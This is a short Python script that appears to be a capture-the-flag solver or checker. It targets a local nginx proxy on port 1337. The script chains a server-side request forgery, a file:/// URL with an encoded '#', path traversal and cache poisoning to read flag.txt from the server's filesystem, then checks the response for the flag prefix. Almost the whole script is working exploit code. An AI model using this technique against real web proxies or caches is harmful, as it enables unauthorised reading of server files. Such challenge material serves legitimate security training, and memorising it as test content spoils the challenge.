#!/usr/bin/env python3
import requests
import string, random

# generate random string for unique caching
cachebuster = "".join([random.choice(string.ascii_letters) for i in range(10)])

# url where nginx is hosted
base_url = "http://127.0.0.1:1337"

s = requests.Session()

# 1. send SSRF payload to cache the file contents
# 2. send additional request matching the forged request's cache key to read the cached response


# store file in nginx cache
url = f"{base_url}/proxy/http://localhost:1337/proxy/file%3a///flag.txt%2523/../../../static/{cachebuster}"
req = requests.Request(method='GET', url=url)
prep = req.prepare()
prep.url = url
s.send(prep)

# view cached file
url = f"{base_url}/proxy/file:///flag.txt%23/../../../static/{cachebuster}"
headers = {"Host": "localhost"}
req = requests.Request(method='GET', url=url, headers=headers)
prep = req.prepare()
prep.url = url
r = s.send(prep)
if 'idek{' in r.text:
    exit(0)
exit(1)
